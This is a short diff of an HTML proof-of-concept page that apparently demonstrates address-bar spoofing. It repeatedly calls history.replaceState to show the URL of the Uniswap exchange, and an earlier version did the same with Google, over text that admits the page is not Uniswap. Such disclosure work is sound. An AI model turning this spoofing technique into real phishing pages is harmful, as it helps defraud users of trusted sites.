@@ -1,14 +1,15 @@
+<!DOCTYPE html>
 <html>
-  <head>
+<head>
     <title>lalala</title>
-  </head>
+</head>
 <body>
-  <script>
-    function spoof(){
-    location="https://www.google.com/csi?random="+Math.random();
-    document.body.innerHTML='This is not Google!';
-    }
-</script>
-<input type="button" value="Run" onclick="setInterval(spoof(),20);"/>
+    <script>
+        function spoof() {
+            history.replaceState(null, '', 'https://www.uniswap.com');
+            document.body.innerHTML = 'This is not actually Uniswap, but I can pretend to be!';
+        }
+    </script>
+    <input type="button" value="Run" onclick="setInterval(spoof, 20);"/>
 </body>
-</html> 
+</html>
